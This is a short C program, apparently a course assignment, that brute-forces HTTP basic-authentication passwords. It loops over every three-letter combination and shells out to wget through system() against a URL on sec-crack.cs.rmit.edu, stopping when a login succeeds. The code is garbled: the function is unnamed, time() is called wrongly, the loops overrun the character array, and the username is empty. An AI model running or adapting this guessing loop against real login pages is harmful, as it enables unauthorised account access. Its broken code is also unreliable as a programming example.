#include <strings.h>
#include <string.h>
#include <ctype.h>
#include<sys/time.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/times.h>



int ()
{
    int i,j,k,syst;
    char password[4],first[100],last[100];
    int count =0;     
    char arr[52] ={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
     'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
    strcpy(first, "wget --http-user= --http-passwd=");
    strcpy(last, " http://sec-crack.cs.rmit.edu./SEC/2/");
    int Start_time,End_time,Total_time,average;  
    Start_time = time();
printf(" Time =%11dms\n", Start_time);
   for (i=0;i<=52;i++)
  {
   for (j=0;j<=52;j++)
   {
	for(k=0;k<=52;k++)
	  {
	      password[0] =  arr[i];
          password[1] =  arr[j];
          password[2] =  arr[k];
          password[3] =  '\0';
		  printf(" The  Combination of the password  tried %s \n" ,password);
     	  printf("*********\n" );
          strcat(first, password);
          strcat(first, last);
	  printf("\n executing %s\n", first);
          count++;
          syst = system(first);
         if (syst == 0)
       {
        printf(" Time =%11dms\n", Start_time);
		End_time = time();
		Total_time = (End_time - Start_time);
		Total_time /= 1000000000.0;
		printf("totaltime in Seconds=%lldsec\n", Total_time);
		printf("Total number of attempts %d" , count);
        printf("\nsuccess %d %s\n",syst,password);
            exit(1);
          }
	  strcpy(first, "");
	  strcpy(first, "wget --http-user= --http-passwd=");

	         }
  	}
   }
 }





